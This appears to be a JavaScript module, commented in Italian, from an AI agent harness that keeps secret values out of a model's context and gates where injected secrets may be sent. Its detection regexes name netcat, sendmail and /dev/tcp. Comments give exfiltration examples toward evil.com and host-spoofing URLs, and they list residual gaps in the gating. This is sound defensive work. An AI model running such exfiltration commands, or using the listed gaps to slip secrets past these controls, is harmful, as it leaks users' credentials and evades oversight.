/**
 * sealed-secrets — registry SIGILLATO + reference-injection + SINK-GATING (F-harness, node-pure, testabile).
 *
 * Pattern "secret-reference / sealed-secret": il VALORE del segreto non entra MAI nel context del modello.
 * Il modello vede solo nome+descrizione (listSecretsMeta), usa un riferimento `{{secret:NAME}}`, e l'harness
 * sostituisce il valore reale SOLO al confine del tool (injectSecrets) e SOLO verso sink consentiti (checkSink).
 * Difesa stratificata: provisioning out-of-band (env/CLI, mai dal modello) · valore-mai-in-context ·
 * sink-gating (vs exfiltration-via-use) · egress-redaction backstop (il valore è registrato in secrets-registry
 * così ogni output che lo contenesse viene comunque redatto).
 *
 * Design: ../../wiki/concepts/sealed-secrets.md. Idea utente 2026-06-30 (msg 577/578/579).
 */
import { SECRET_PATTERNS } from "./secrets-redact.mjs";
import { registerEgressRaw } from "./secrets-registry.mjs";
import { createHash } from "node:crypto";

/** Fingerprint NON-reversibile (sha256 troncato + lunghezza): per verificare l'IDENTITÀ di un secret senza vederne il
 * valore (idea utente: "verificare se un segreto è inserito correttamente"). Non espone alcun carattere del valore. */
function fingerprint(value) {
  return `sha256:${createHash("sha256").update(String(value)).digest("hex").slice(0, 10)}/len:${String(value).length}`;
}

/** Registry sigillato: name → { value, description, allowedSinks[] }. In-memory, MAI su disco in chiaro. */
const SEALED = new Map();
const MAX_SEALED = 256;
const NAME_RE = /^[A-Za-z0-9_.\-]{1,64}$/;
const SECRET_REF = /\{\{secret:([A-Za-z0-9_.\-]+)\}\}/g; // riferimento usato dal modello negli args

/**
 * Registra/aggiorna un sealed-secret. Il valore NON è mai esposto da listSecretsMeta. Di default lo registra anche
 * in secrets-registry (egress-redaction backstop). `redactEgress` (default true):
 *   - true  → il valore entra nel Set di egress → INVARIANTE 'ogni sealed-value è redigibile' (review P1): un valore
 *             corto/poco-vario eco-ato in un output viene comunque redatto (no leak provider/transcript).
 *   - false → opt-out per i secret CORTI/poco-entropici (OTP, PIN, una data: utente msg 603): redigerli globalmente
 *             corromperebbe ogni output che contiene quella stringa (RUMORE). Il secret resta SIGILLATO e iniettabile,
 *             ma NON è aggiunto al backstop → trade-off esplicito (accettabile per un OTP usa-e-getta).
 * @returns {{ok:boolean, name?:string, reason?:string, warn?:string}}
 */
export function setSecret(name, value, { description = "", allowedSinks = [], redactEgress = true, allowLocalHttp = false } = {}) {
  if (typeof name !== "string" || !NAME_RE.test(name)) return { ok: false, reason: "nome non valido (usa [A-Za-z0-9_.-], max 64)" };
  if (typeof value !== "string" || value.length < 1) return { ok: false, reason: "valore vuoto" };
  if (!SEALED.has(name) && SEALED.size >= MAX_SEALED) return { ok: false, reason: `registry pieno (max ${MAX_SEALED})` };
  const sinks = Array.isArray(allowedSinks) ? [...new Set(allowedSinks.map((s) => String(s).toLowerCase().trim()).filter(Boolean))] : [];
  const redact = redactEgress !== false;
  let warn;
  if (redact) {
    if (!registerEgressRaw(value)) return { ok: false, reason: "valore non registrabile per la redazione (egress pieno)" };
  } else {
    warn = `'${name}': redactEgress=false → il valore NON sarà redatto dagli output (scelta per evitare rumore su OTP/short; non eco-arlo in chiaro)`;
  }
  SEALED.set(name, { value, description: String(description || ""), allowedSinks: sinks, redactEgress: redact, allowLocalHttp: allowLocalHttp === true, fingerprint: fingerprint(value) });
  return warn ? { ok: true, name, warn } : { ok: true, name };
}

/**
 * setAllowLocalHttp — abilita/disabilita il flag `allowLocalHttp` di un secret ESISTENTE (utente msg 668). Il secret
 * diventa usabile su `http://` MA SOLO verso loopback letterale (vedi checkSink). Va chiamata SOLO dopo consenso
 * ESPLICITO dell'utente (Ask della TUI o provisioning out-of-band), MAI per auto-decisione del modello.
 * @returns {{ok:boolean, name?:string, allowLocalHttp?:boolean, reason?:string}}
 */
export function setAllowLocalHttp(name, allow = true) {
  const s = SEALED.get(name);
  if (!s) return { ok: false, reason: "secret does not exist" };
  s.allowLocalHttp = allow === true; // solo true abilita (coerente con setSecret; no truthiness sorprese)
  return { ok: true, name, allowLocalHttp: s.allowLocalHttp };
}

/** Vista per il MODELLO: nome + descrizione + allowedSinks + allowLocalHttp, MAI il valore. */
export function listSecretsMeta() {
  return [...SEALED.entries()].map(([name, s]) => ({ name, description: s.description, allowedSinks: s.allowedSinks, allowLocalHttp: s.allowLocalHttp === true, fingerprint: s.fingerprint }));
}

/** Esiste un sealed-secret con questo nome? */
export function hasSecret(name) {
  return SEALED.has(name);
}

/** INTERNO — il valore reale (per la sola sostituzione). NON esporre al modello. */
function valueOf(name) {
  return SEALED.get(name)?.value ?? null;
}

/** I nomi-secret `{{secret:NAME}}` referenziati in un testo (unici). */
export function referencedSecrets(text) {
  const out = new Set();
  let m;
  SECRET_REF.lastIndex = 0;
  while ((m = SECRET_REF.exec(String(text ?? "")))) out.add(m[1]);
  return [...out];
}

/**
 * Host (lowercase, senza userinfo/porta) dei URL in un testo di operazione. SECURITY (review P0): la cattura TERMINA
 * l'authority anche su `?` `#` `\` (RFC 3986) — altrimenti `https://evil.com#.openai.com` darebbe host
 * `evil.com#.openai.com` che fa suffix-match con `.openai.com` mentre il client si connette a evil.com (spoof). +
 * fail-closed: un host con caratteri NON-DNS residui viene SCARTATO (→ conta come host-non-identificabile → blocco).
 */
export function extractHosts(opText) {
  const out = new Set();
  const re = /\b[a-z][a-z0-9+.\-]*:\/\/([^/\s'"`)?#\\]+)/gi;
  let m;
  while ((m = re.exec(String(opText ?? "")))) {
    let h = m[1];
    const at = h.lastIndexOf("@"); if (at >= 0) h = h.slice(at + 1); // toglie user:pass@
    h = h.split(":")[0].toLowerCase(); // toglie :porta
    if (h && /^[a-z0-9.\-]+$/.test(h)) out.add(h); // SOLO host DNS-valido (scarta residui sporchi → fail-closed)
  }
  return [...out];
}

/** L'operazione usa flag che disaccoppiano l'host-URL dalla destinazione REALE (curl --resolve/--connect-to/proxy,
 * header Host: ridefinito)? In quel caso l'allow-host non è più verificabile → fail-closed. (review P2 host-pinning) */
export function hasHostPinning(opText) {
  const t = String(opText ?? "");
  return /(^|\s)(--resolve|--connect-to|--interface)(\s|=)/.test(t) ||
    /(^|\s)(-x|--proxy[0-9a-z-]*)(\s|=)/i.test(t) ||
    /-H\s*['"]?\s*host\s*:/i.test(t);
}

/** Il testo dell'operazione SCRIVE il segreto su file / lo esfiltra in modo evidente (deny-shapes)? */
export function hasFileOrPipeExfil(opText) {
  const t = String(opText ?? "");
  // redirezione a file (> >>), tee, pipe verso netcat/sendmail/mail — shape esfiltranti comuni.
  return /(^|\s)(>>?|\|\s*tee\b|\btee\b)\s*\S/.test(t) || /\|\s*(nc|ncat|netcat|sendmail|mail)\b/.test(t);
}

/** L'operazione invia verso un URL `http://` in CHIARO (non-TLS)? Un sealed-secret non deve transitare in plaintext. */
export function hasInsecureHttp(opText) {
  return /\bhttp:\/\//i.test(String(opText ?? ""));
}

/**
 * L'operazione COMPONE più comandi / sostituzioni (≠ singola richiesta a un solo URL)? Usato SOLO dal fast-path
 * `allowLocalHttp` (review-loop 2026-06-30, P0): una deny-shape come `https-only` perde contro la composizione
 * (`curl http://localhost ; nc evil.com`, `1>/dev/tcp/evil.com/80`, `$(...)`), quindi il fast-path consente SOLO una
 * shape PULITA (un comando, un URL) e qualunque segnale di composizione lo invalida → si ricade sul blocco normale.
 * Segnali: separatori/chaining/background, pipe, sostituzioni `$()`/`<()`, bash net-redirect `/dev/tcp|udp`, newline
 * (anche dal join multi-arg di injectIntoStrings → uno split-view tra argomenti). NB: `&` di una URL-query
 * (`?a=1&b=2`) NON conta (richiede whitespace/boundary attorno) per non bloccare URL legittimi con parametri.
 */
export function hasCommandComposition(opText) {
  const t = String(opText ?? "");
  // separatori-di-comando + whitespace-di-CONTROLLO (TAB/CR/VT/FF/NUL): NON lo SPACE (0x20) — rompe ogni comando —
  // ma gli altri whitespace sono anomali in un comando legittimo e servono a obfuscare operandi (review-loop #2 2026-06-30).
  if (/[\n\r\t\f\v\0;`|]/.test(t)) return true;              // newline/CR/TAB/VT/FF/NUL · ; · backtick · pipe (incl. ||)
  if (/&&/.test(t) || /(^|\s)&(\s|$)/.test(t)) return true;  // && · backgrounding & (non &param di URL)
  if (/\$\(|<\(/.test(t)) return true;                       // $(...) · <(...)
  if (/\/dev\/(tcp|udp)\b/i.test(t)) return true;            // bash network redirect (esfil senza nc)
  return false;
}

/**
 * L'operazione contiene un OPERANDO-HOST "estraneo" (non-loopback)? Guardia STRUTTURALE del fast-path allowLocalHttp
 * (review-loop #2/#3 2026-06-30 + security-review: P0 bare-operand). CAUSA-RADICE: `extractHosts` vede solo gli host
 * `scheme://`, ma `curl`/`wget` accettano operandi SENZA schema in OGNI codifica IP (dominio, IPv4, dotted-numerico
 * corto `8.8`→8.0.0.8, decimale `2130706433`, hex `0x..`, IPv6 `[..]`) e vi applicano `-H Authorization:` → leak
 * esterno (verificato con curl reale). Invece di RINCORRERE le codifiche con regex (denylist incompleto), NORMALIZZIAMO
 * ogni candidato-host come fa curl, via `new URL("http://"+tok).hostname` (parser WHATWG = stessa espansione IPv4 di
 * curl), e pretendiamo che il risultato sia loopback. Pre-pass: togliamo le stringhe QUOTATE (header/body legittimi:
 * un host citato lì non è un operando) e gli URL `scheme://` (host già verificato da extractHosts).
 * Candidato = token con punto / `0x..` / `[..]` / decimale grande → esclude i numeri PICCOLI (flag-value `--max-time 30`)
 * e i token single-word (`-A myagent`) → niente falso-blocco. RESIDUO ACCETTATO (de-prioritizzato, exfil-via-use): un host
 * SINGLE-LABEL senza punto (`myserver`) sfugge → ma esfiltra solo se l'attaccante controlla il DNS locale (contrived).
 */
export function hasForeignHostToken(opText) {
  let t = String(opText ?? "");
  t = t.replace(/'[^']*'/g, " ").replace(/"[^"]*"/g, " ");          // togli stringhe quotate (body/header)
  t = t.replace(/\b[a-z][a-z0-9+.\-]*:\/\/[^\s'"`]+/gi, " ");       // togli URL scheme:// per intero
  for (const raw of t.split(/\s+/)) {
    if (!raw || raw.startsWith("-")) continue;                      // flag → ok
    const tok = raw.replace(/[)(;,'"`]+$/g, "");                    // togli punteggiatura di coda
    if (!tok) continue;
    const isCandidate = /\./.test(tok) || /^0x[0-9a-f]+$/i.test(tok) || /^\[.*\]/.test(tok) || /^\d{7,}$/.test(tok);
    if (!isCandidate) continue;                                     // numeri piccoli / single-word → non-host (no FP)
    let hostname;
    try { hostname = new URL("http://" + tok).hostname; } catch { return true; } // candidato malformato → fail-closed
    const h = hostname.replace(/^\[|\]$/g, "");                     // togli [] IPv6 prima del check loopback
    if (h && !isLoopbackLiteral(h)) return true;                    // host curl-canonico non-loopback → estraneo
  }
  return false;
}

/**
 * isLoopbackLiteral — `host` è un loopback LETTERALE (127.0.0.0/8, `localhost`, `::1`)? Usato dal fast-path
 * `allowLocalHttp`: http è consentito SOLO verso loopback, e SOLO su host LETTERALE (non hostname arbitrari) per non
 * dipendere dalla risoluzione DNS (anti DNS-rebinding). NB: `localhost` è incluso per ergonomia dev; un /etc/hosts
 * sabotato potrebbe rimapparlo (rischio residuo accettato: è la macchina dell'utente). IPv6 in URL `http://[::1]`:
 * extractHosts non estrae le parentesi → usa 127.0.0.1/localhost (limite noto).
 */
export function isLoopbackLiteral(host) {
  const h = String(host ?? "").toLowerCase().trim();
  if (h === "localhost" || h === "::1") return true;
  const m = h.match(/^127\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  return !!m && m.slice(1).every((o) => Number(o) >= 0 && Number(o) <= 255);
}

/**
 * checkSink — sink-gating per UN secret verso l'operazione `opText`. Modi:
 *   - 'strict' (default): allow-host fail-closed. Se il secret dichiara allowedSinks → consenti SOLO se TUTTI gli
 *     host del comando sono in allow-list (e nessuna scrittura-file). Se NON dichiara allowedSinks → BLOCCA ogni
 *     sink di rete o scrittura-file (il secret è usabile solo in op locali senza vettore d'uscita verificabile).
 *   - 'warn': come strict ma i blocchi-da-deny-list (secret senza allow-list) diventano warning (consentito).
 *   - 'off': nessun gating.
 * @returns {{allowed:boolean, reason?:string, warn?:string}}
 */
export function checkSink(name, opText, mode = "strict") {
  const s = SEALED.get(name);
  if (!s) return { allowed: false, reason: "secret does not exist" };
  if (mode === "off") return { allowed: true };
  const hosts = extractHosts(opText);
  const fileExfil = hasFileOrPipeExfil(opText);
  const hostPinned = hasHostPinning(opText);
  // FAST-PATH allowLocalHttp (utente msg 668) — è una deroga RISTRETTA e CONSENSO-GATED, NON la tesi "loopback è
  // sicuro" (review-loop 2026-06-30, H2/P0): un comando composto o un relay/redirect locale può ANCORA muovere il
  // valore (= exfil-via-use, de-prioritizzata). Ciò che rende la deroga accettabile è il consenso ESPLICITO
  // dell'utente (request_local_http/CLI), non la natura del loopback. Per non riaprire l'exfil-FACILE la concediamo
  // SOLO a una shape PULITA — tutte necessarie: (a) opt-in attivo; (b) ≥1 host e (c) OGNI host loopback letterale;
  // (d) niente scrittura-file; (e) niente host-pinning (CRITICO: `--resolve`/proxy rimapperebbero "localhost" su un IP
  // esterno); (f) UN SOLO URL (countUrls su `://`, anti `2://evil.com` invisibile a extractHosts); (g) niente
  // composizione di comandi (`;`/`&&`/`|`/`$()`/newline = un secondo canale d'uscita). Concesso → bypassa https-only
  // E allowedSinks per QUEL solo comando-loopback (qualsiasi schema: anche https://localhost).
  const urlCount = (String(opText).match(/:\/\//g) || []).length;
  if (s.allowLocalHttp && hosts.length && hosts.every(isLoopbackLiteral)
      && !fileExfil && !hostPinned && urlCount === 1
      && !hasCommandComposition(opText) && !hasForeignHostToken(opText)) {
    // (g) niente token-host estraneo: chiude il bare-operand (`curl http://localhost evil.com` → evil.com = 2° URL).
    return { allowed: true };
  }
  // https-only: un sealed-secret NON transita su http:// in chiaro (vale in strict E warn: è igiene crittografica).
  if (hasInsecureHttp(opText)) {
    const loopbackHint = hosts.length && hosts.every(isLoopbackLiteral)
      ? " (loopback target: enable allowLocalHttp via request_local_http, and use a SINGLE clean command — no ';'/'|'/'&&')"
      : " (use https)";
    return { allowed: false, reason: `'${name}' cannot be sent over http:// in cleartext${loopbackHint}` };
  }

  if (s.allowedSinks.length) {
    // allow-host fail-closed (vale anche in 'warn': l'allow-list è una scelta esplicita dell'utente)
    if (fileExfil) return { allowed: false, reason: `'${name}' cannot be written to a file/pipe (write detected)` };
    if (hostPinned) return { allowed: false, reason: `'${name}': host-pinning detected (--resolve/--connect-to/proxy/Host:) → the real destination is not verifiable from the URL, blocked` };
    if (!hosts.length) return { allowed: false, reason: `'${name}' requires a destination among [${s.allowedSinks.join(", ")}] but no host is identifiable in the operation (fail-closed)` };
    const bad = hosts.filter((h) => !s.allowedSinks.some((a) => hostMatches(h, a)));
    if (bad.length) return { allowed: false, reason: `'${name}' allowed only toward [${s.allowedSinks.join(", ")}]; disallowed hosts: ${bad.join(", ")}` };
    return { allowed: true };
  }

  // secret SENZA allow-list dichiarata → deny-list conservativa
  const allLoopback = hosts.length && hosts.every(isLoopbackLiteral);
  const reason = fileExfil
    ? `'${name}' without allowedSinks: file/pipe write blocked`
    : hosts.length
      ? allLoopback
        // host loopback ma flag OFF (es. https://localhost): due rimedi possibili → li nomino entrambi (anti-cerimonia M4)
        ? `'${name}' without allowedSinks: blocked toward localhost. Either add the loopback host to allowedSinks, or (for http) enable allowLocalHttp via request_local_http.`
        : `'${name}' without allowedSinks: network send blocked (declare allowedSinks to use it toward a host)`
      : null;
  if (reason) {
    if (mode === "warn") return { allowed: true, warn: reason };
    return { allowed: false, reason };
  }
  return { allowed: true };
}

/** host == allow-pattern: match esatto o suffix-dominio (`api.x.com` ⊆ allow `x.com`); allow `*` = qualsiasi. */
function hostMatches(host, allow) {
  if (allow === "*") return true;
  if (host === allow) return true;
  return host.endsWith("." + allow);
}

/**
 * injectSecrets — sostituisce `{{secret:NAME}}` con il valore reale in `opText`, applicando il sink-gating.
 * Se un riferimento è bloccato (sink non consentito / secret inesistente) → NON sostituisce e lo riporta in
 * `blocked` (il chiamante deve RIFIUTARE l'operazione, non eseguirla parzialmente). @returns
 *   {{ text:string, injected:string[], blocked:{name:string,reason:string}[], warnings:string[] }}
 */
export function injectSecrets(opText, mode = "strict") {
  const refs = referencedSecrets(opText);
  const injected = [], blocked = [], warnings = [];
  let text = String(opText ?? "");
  for (const name of refs) {
    if (!SEALED.has(name)) { blocked.push({ name, reason: "secret does not exist" }); continue; }
    const gate = checkSink(name, opText, mode);
    if (!gate.allowed) { blocked.push({ name, reason: gate.reason }); continue; }
    if (gate.warn) warnings.push(`${name}: ${gate.warn}`);
    text = text.split(`{{secret:${name}}}`).join(valueOf(name));
    injected.push(name);
  }
  return { text, injected, blocked, warnings };
}

/**
 * scanIngress — regex-ingress: trova in `text` valori che SEMBRANO segreti (pattern statici noti), per sigillarli
 * PRIMA che entrino nel context. Ritorna i match unici + il livello di confidenza. NON modifica il testo (la
 * sostituzione/seal la decide il chiamante: auto sui high-confidence, ask sugli altri).
 * @returns {{ value:string, confidence:'high'|'medium' }[]}
 */
export function scanIngress(text) {
  const found = new Map(); // value → confidence
  const t = String(text ?? "");
  for (const re of SECRET_PATTERNS) {
    re.lastIndex = 0;
    let m;
    while ((m = re.exec(t))) {
      const v = m[0];
      if (v && v.length >= 8) found.set(v, "high"); // i SECRET_PATTERNS sono shape ad alta confidenza
    }
  }
  return [...found.entries()].map(([value, confidence]) => ({ value, confidence }));
}

/**
 * loadFromEnv — provisioning OUT-OF-BAND: legge i secret da env `SEALED_SECRET_<NAME>=value` (il valore non passa
 * mai dal modello). La metadata (description, allowedSinks) arriva da `meta` (es. da .pi/secrets.config.json, che
 * NON contiene valori). @returns {string[]} nomi caricati.
 */
export function loadFromEnv(env = process.env, meta = {}) {
  const loaded = [];
  for (const [k, v] of Object.entries(env)) {
    if (!k.startsWith("SEALED_SECRET_") || v == null || v === "") continue;
    const name = k.slice("SEALED_SECRET_".length);
    if (!NAME_RE.test(name)) continue;
    const m = meta[name] || {};
    const r = setSecret(name, String(v), { description: m.description ?? "", allowedSinks: m.allowedSinks ?? [], redactEgress: m.redactEgress, allowLocalHttp: m.allowLocalHttp });
    if (r.ok) loaded.push(name);
  }
  return loaded;
}

/**
 * injectIntoStrings — variante multi-arg per il hook tool_call: gate di TUTTI i riferimenti contro il testo
 * COMBINATo (un url in un arg + il ref in un altro vengono visti insieme), poi sostituzione per-stringa. FAIL-CLOSED:
 * se anche UN solo riferimento è bloccato, NON sostituisce NULLA (niente exec parziale). Il valore resta nel modulo.
 * @param {string[]} strings @param {SinkMode} [mode] @returns {{strings:string[], injected:string[], blocked:{name,reason}[], warnings:string[]}}
 */
export function injectIntoStrings(strings, mode = "strict") {
  const arr = Array.isArray(strings) ? strings.map((s) => String(s ?? "")) : [];
  const combined = arr.join("\n");
  const refs = referencedSecrets(combined);
  const blocked = [], warnings = [];
  if (!refs.length) return { strings: arr, injected: [], blocked, warnings };
  const valueMap = {};
  for (const name of refs) {
    if (!SEALED.has(name)) { blocked.push({ name, reason: "secret does not exist" }); continue; }
    const gate = checkSink(name, combined, mode);
    if (!gate.allowed) { blocked.push({ name, reason: gate.reason }); continue; }
    if (gate.warn) warnings.push(`${name}: ${gate.warn}`);
    valueMap[name] = SEALED.get(name).value;
  }
  if (blocked.length) return { strings: arr, injected: [], blocked, warnings }; // fail-closed: non sostituire nulla
  const out = arr.map((s) => {
    let t = s;
    for (const [name, val] of Object.entries(valueMap)) t = t.split(`{{secret:${name}}}`).join(val);
    return t;
  });
  return { strings: out, injected: Object.keys(valueMap), blocked, warnings };
}

/** INTERNO — nome del sealed-secret il cui valore == `value` (per riusare il riferimento, no doppio-seal). */
function nameForValue(value) {
  for (const [name, s] of SEALED.entries()) if (s.value === value) return name;
  return null;
}

let ingressCounter = 0;

/**
 * autoSealIngress — REGEX-INGRESS (idea utente msg 578/579 "intercettate tramite regex... harness ti fa domanda"):
 * scansiona `text` per valori secret-shaped (scanIngress) e li SIGILLA al volo, sostituendo nel testo ogni valore con
 * il suo riferimento `{{secret:NAME}}`. Risultato: il VALORE non raggiunge mai il modello/provider (è il testo
 * trasformato che va avanti) + è redatto dai transcript (egress). Un valore già sigillato riusa il suo nome.
 * I match auto-rilevati NON dichiarano allowedSinks → in strict restano lockdown (un paste accidentale non è
 * esfiltrabile finché l'utente non lo abilita esplicitamente). @returns {{ text:string, sealed:{name,confidence}[] }}
 */
export function autoSealIngress(text, { redactEgress = true } = {}) {
  const hits = scanIngress(text);
  let out = String(text ?? "");
  const sealed = [];
  for (const h of hits) {
    let name = nameForValue(h.value);
    if (!name) {
      name = `INGRESS_${++ingressCounter}`;
      const r = setSecret(name, h.value, { description: `auto-ingress regex (${h.confidence})`, allowedSinks: [], redactEgress });
      if (!r.ok) continue;
    }
    out = out.split(h.value).join(`{{secret:${name}}}`);
    sealed.push({ name, confidence: h.confidence });
  }
  return { text: out, sealed };
}

/** Svuota il registry (test / fine-sessione). */
export function clearSealed() {
  SEALED.clear();
  ingressCounter = 0;
}

export default { setSecret, setAllowLocalHttp, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp, hasCommandComposition, hasForeignHostToken, hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, loadFromEnv, clearSealed };
